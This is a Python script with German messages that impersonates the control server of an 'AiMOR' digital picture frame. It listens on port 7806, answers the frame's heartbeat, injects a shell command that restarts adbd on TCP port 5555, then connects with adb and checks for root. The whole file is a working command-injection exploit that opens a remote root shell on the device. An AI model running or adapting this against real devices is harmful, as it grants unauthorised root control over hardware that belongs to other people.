#!/usr/bin/env python3
"""Dedicated AiMOR Port 7806 Command Injector."""
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

sys.path.insert(0, str(Path(__file__).parent))
from proto import FrameReader, frame, edu_pipeline, CMD_PIP_HEAD, RECEIVE_SHELL_COMMAND

ADB_COMMAND = 'setprop service.adb.tcp.port 5555; stop adbd; start adbd'
HOST_IP = '192.168.137.1'
adb_path = r"C:\Users\beren\platform-tools\adb.exe"

def main():
    print("=" * 60)
    print("AiMOR Port 7806 Listener gestartet!")
    print(f"Lausche auf {HOST_IP}:7806...")
    print("=" * 60)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((HOST_IP, 7806))
        listener.listen(5)
        listener.settimeout(1)

        while True:
            try:
                conn, (peer_ip, peer_port) = listener.accept()
            except socket.timeout:
                continue

            print(f"\n[AIMOR] >>> VERBINDUNG VOM BILDERRAHMEN ({peer_ip}:{peer_port}) ERKANNT! <<<")
            reader = FrameReader()
            conn.settimeout(2)
            session_start = time.monotonic()
            cmd_sent = False

            with conn:
                while time.monotonic() - session_start < 60:
                    try:
                        data = conn.recv(4096)
                    except socket.timeout:
                        continue
                    if not data:
                        print(f"[AIMOR] Verbindung geschlossen.")
                        break

                    for seq, cmd, payload in reader.feed(data):
                        print(f"[AIMOR] Empfangener Befehl: {cmd} ({len(payload)} Bytes)")
                        if cmd == 101 and not payload:
                            conn.sendall(frame(seq, 101, b''))
                            print("[AIMOR] Heartbeat beantwortet.")
                        elif not cmd_sent:
                            print(f"[AIMOR] Sende Root-ADB-Befehl an Rahmen...")
                            payload_cmd = edu_pipeline(RECEIVE_SHELL_COMMAND, ADB_COMMAND.encode())
                            packet = frame(1, CMD_PIP_HEAD, payload_cmd)
                            conn.sendall(packet)
                            cmd_sent = True
                            print(f"[AIMOR] >>> BEFEHL ERFOLGREICH GESENDET! <<<")
                            time.sleep(2)

                            # ADB Verbindung testen
                            print(f"[ADB] Verbinde mit {peer_ip}:5555...")
                            res = subprocess.run([adb_path, "connect", f"{peer_ip}:5555"], capture_output=True, text=True, timeout=5)
                            print(f"[ADB] {res.stdout.strip()}")
                            id_check = subprocess.run([adb_path, "-s", f"{peer_ip}:5555", "shell", "id"], capture_output=True, text=True, timeout=5)
                            print(f"[ADB] Root-Status: {id_check.stdout.strip()}")
                            print("\n" + "=" * 60)
                            print("FERTIG! ROOT ADB IST AKTIV!")
                            print("=" * 60)
                            return

if __name__ == '__main__':
    main()
